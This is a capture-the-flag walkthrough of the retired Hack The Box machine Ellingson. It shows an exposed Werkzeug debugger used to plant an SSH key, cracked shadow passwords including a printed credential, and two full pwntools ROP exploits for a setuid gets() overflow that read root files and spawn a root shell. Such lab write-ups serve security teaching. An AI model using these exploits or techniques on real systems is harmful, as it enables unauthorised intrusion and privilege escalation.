---
layout: post
title: "Ellingson: Hack The Box Walkthrough"
date: 2019-10-19 15:53:21 +0000
last_modified_at: 2019-10-19 15:53:21 +0000
category: Walkthrough
tags: ["Hack The Box", Ellingson, retired]
comments: true
image:
  feature: ellingson-htb-walkthrough.jpg
  credit: Pavlofox / Pixabay
  creditlink: https://pixabay.com/photos/coal-miners-minerals-extraction-1521718/
---

This post documents the complete walkthrough of Ellingson, a retired vulnerable [VM][1] created by [Ic3M4n][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Ellingson is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.139 --rate=1000                                                                                      

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-21 02:33:21 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.139
Discovered open port 22/tcp on 10.10.10.139
```

Nothing extraordinary. Let's do one better with `nmap` scanning the discovered ports to establish the services.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.139
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
```

Well, I'm left with `http` service to explore. Here's how it looks like in my browser.


{% include image.html image_alt="ca84f425.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/ca84f425.png" %}


### Interactive Werkzeug Debugger

It isn't long before I chance upon the interactive debugger. Turns out the site is powered by Flask, though it isn't clear from the outset.


{% include image.html image_alt="98e5f768.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/98e5f768.png" %}


Man, this is as good as a Python shell. :triumph:


{% include image.html image_alt="2b5f6893.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/2b5f6893.png" %}


Long story short, the debugger is ran with `hal`'s permissions. As such, we can write a SSH public key we control to `/home/hal/.ssh/authorized_keys` like so.


{% include image.html image_alt="1f247e39.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/1f247e39.png" %}


Play nice, append and leave a newline for the next contender.

## Low-Privilege Shell

With that, we can log in to SSH as `hal`.


{% include image.html image_alt="39813f57.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/39813f57.png" %}


During enumeration of `hal`'s account, I notice that `hal` is part of the `adm` group.


{% include image.html image_alt="3139866c.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/3139866c.png" %}


`hal` is able to read `/var/backups/shadow.bak`.


{% include image.html image_alt="73610fa0.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/73610fa0.png" %}


John the Ripper is able to crack two of the passwords.


{% include image.html image_alt="50a6ac05.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/50a6ac05.png" %}


I was able to `su` as `margo` with the credential (`margo:iamgod$08`).


{% include image.html image_alt="d773e705.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/d773e705.png" %}


The file `user.txt` is in `margo`'s home directory.


{% include image.html image_alt="e694ab9c.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/e694ab9c.png" %}


## Privilege Escalation

During enumeration of `margo`'s account, I found a `setuid` executable at `/usr/bin/garbage`.


{% include image.html image_alt="b0c7e54e.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/b0c7e54e.png" %}


Disassembly of the file reveals that only `root(0)`, `margo(1002)` and `theplague(1000)` can access the executable.


{% include image.html image_alt="d4fb756c.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/d4fb756c.png" %}


At first I thought that bypassing the access password and getting to the console allows me to launch commands.


{% include image.html image_alt="99dd0b49.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/99dd0b49.png" %}


Boy, it's not that simple.


{% include image.html image_alt="679ef3ce.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/679ef3ce.png" %}


Any option besides Exit goes into an endless loop of doing nothing except printing garbage. Oh, I see the pun here. :smirk:

### Binary Exploitation

Bypassing the access password is not the be all and end all for this exploitation. Lucky for us, getting the access password from `stdin` was implemented with `gets(3)`, a well-known dangerous function that causes buffer overflow due to a lack of size check.


{% include image.html image_alt="cc32dc64.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/cc32dc64.png" %}


#### Offset

Let's take a look at how to calculate the offset required to control the return address with simple math.


{% include image.html image_alt="5177163d.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/5177163d.png" %}


:point_up: Here we have the return address `<main+41>` at the top of the stack after stepping into the `auth` function. Take note the stack address.


{% include image.html image_alt="9dd033c4.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/9dd033c4.png" %}


:point_up: Here we have the buffer where the character(s) from `stdin` are stored. Note that we have not executed the function.


{% include image.html image_alt="92ad7417.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/92ad7417.png" %}


:point_up: Simply calculate the difference between the two memory addresses and you get the offset required to control the return address. In this case, the offset is 136 bytes.

To further demonstrate that we do indeed have control over the return address, let's create an input file like so.

```
# perl -e 'print "A" x 136 . "B" x 6' > input
```


{% include image.html image_alt="4c80d6ac.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/4c80d6ac.png" %}


There you have it.

#### Exploit Development

Now that we know where to write, it's time to figure out what to write. The stack is not executable and Address Space Layout Randomization (ASLR) is enabled on the machine. As such, we have to rely on return-oriented programming (ROP) gadgets to bypass all that. There are plenty of ROP gadgets in this binary, however, the ones that we need are these:

```
0x0000000000401012 : add rsp, 8 ; ret
0x000000000040179b : pop rdi ; ret
0x0000000000401799 : pop rsi ; pop r15 ; ret
0x0000000000401016 : ret
```

These gadgets will help us populate function arguments. The x64 function-calling convention for the first three arguments is: 1st argument (`rdi`), 2nd argument (`rsi`), and 3rd argument (`rdx`).

The game plan is this: we make use of PLT functions (because their address don't change) — `gets(3)`, `fopen(3)`, `read(2)`, and `puts(3)` to get from `stdin` the full path of the file that we want to read and display the content of that file in `stdout`. And since `garbage` is a `setuid` executable, we can read sensitive files such as `/etc/shadow` and`/root/root.txt`.

Enough of introduction, here's the exploit code in Python. Further explanation can be found in the code below.

```python
'''
# ROPgadget --binary garbage
0x0000000000401012 : add rsp, 8 ; ret
0x000000000040179b : pop rdi ; ret
0x0000000000401799 : pop rsi ; pop r15 ; ret
0x0000000000401016 : ret
'''

from pwn import *

# front matter
offset   = "A" * 136
pathname = 0x404100  # somewhere in .bss
mode     = 0x404120  # somewhere in .bss
ops      = 0x404140  # somewhere in .bss
buf      = 0x404200  # somewhere in .bss
payload  = ''

# functions
exit   = 0x401160
fopen  = 0x401130
gets   = 0x401100
puts   = 0x401050
read   = 0x4010c0

# gadgets
pop_rdi_ret = 0x40179b
pop_rsi_pop_ret = 0x401799
ret = 0x401016
skip = 0x401012

# exploit format
payload += offset

# get(pathname) - file we want to open
payload += p64(pop_rdi_ret)
payload += p64(pathname)
payload += p64(gets)
payload += p64(ret)

# get(mode) - r for reading, w for writing, etc.
payload += p64(pop_rdi_ret)
payload += p64(mode)
payload += p64(gets)
payload += p64(ret)

# fopen(pathname, mode)
payload += p64(pop_rsi_pop_ret)
payload += p64(mode)
payload += p64(skip)
payload += p64(pop_rdi_ret)
payload += p64(pathname)
payload += p64(fopen)
payload += p64(ret)

# get(ops) - this is basically redundant, the
# only purpose is to make sure rdx contains a
# large enough integer
payload += p64(pop_rdi_ret)
payload += p64(ops)
payload += p64(gets)
payload += p64(ret)

# read(4, buf, x) - the file descriptor from the
# previous fopen is almost certainly to result
# in file descriptor being 4
payload += p64(pop_rsi_pop_ret)
payload += p64(buf)
payload += p64(skip)
payload += p64(pop_rdi_ret)
payload += p64(4)
payload += p64(read)
payload += p64(ret)

# puts(buf) - display buf in stdout
payload += p64(pop_rdi_ret)
payload += p64(buf)
payload += p64(puts)
payload += p64(ret)

# exit(0)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(exit)

# write payload to file
f = open('payload', 'wb')
f.write(payload)
f.close
```

Let's give it a shot. Generate the payload and send it to `margo` using `scp`.

```
# python exploit.py
# scp payload margo@10.10.10.139:/tmp
```

Log in to `margo`'s account via SSH and navigate to `/tmp` (that's where our payload is) and let the magic begins. We'll see if we can read `/etc/shadow`.


{% include image.html image_alt="15d31617.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/15d31617.png" %}


Amazing. Where's the `root` password hash?


{% include image.html image_alt="ab1de2c0.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/ab1de2c0.png" %}


I see. `root` logs in via the password-protected private key. Anyways, I'm not going to crack anything. Let's just retrieve `root.txt` and call it a day.


{% include image.html image_alt="85410364.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/85410364.png" %}


:dancer:

## Afterthought

Because I'm always challenging myself, let's write another exploit that will give us an interactive `root` shell instead.

```python
from pwn import *
import binascii

context(terminal=["tmux", "new-windows"])
context(os="linux", arch="amd64")

s = ssh(host="10.10.10.139", user="margo", password="iamgod$08")
p = s.process("garbage")

junk = 'A' * 136

plt_main = p64(0x401619)
plt_puts = p64(0x401050)
got_puts = p64(0x404028)
pop_rdi  = p64(0x40179b)
pop_rsi  = p64(0x401799)

payload = junk + pop_rdi + got_puts + plt_puts + plt_main

p.sendline(payload)
p.recvuntil("access denied.")
leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBC:  " + "0x" + binascii.hexlify(leaked_puts).decode("hex")[::-1].encode("hex"))
leaked_puts = u64(leaked_puts)

off_puts = 0x809c0
off_sys  = 0x4f440
off_exe  = 0xe4fa0
off_sh   = 0x1b3e9a
off_suid = 0xe5970

base_libc = leaked_puts - off_puts
log.success("GLIBC base address: " + "0x" + binascii.hexlify(p64(base_libc)).decode("hex")[::-1].encode("hex"))

libc_exe  = p64(base_libc + off_exe)
libc_sys  = p64(base_libc + off_sys)
libc_sh   = p64(base_libc + off_sh)
libc_suid = p64(base_libc + off_suid)

payload = junk + pop_rdi + p64(0) + libc_suid + pop_rdi + libc_sh + pop_rsi + p64(0) + p64(0xdeadbeef) + libc_exe

p.sendline(payload)
p.recvuntil("access denied.")
log.success("Enjoy your shell!")
p.interactive()
```

{% include image.html image_alt="24f133ef.png" image_src="/3b69ee97-9d1e-43c2-935c-5b942b3d7310/24f133ef.png" %}


[1]: https://www.hackthebox.eu/home/machines/profile/189
[2]: https://www.hackthebox.eu/home/users/profile/30224
[3]: https://www.hackthebox.eu/
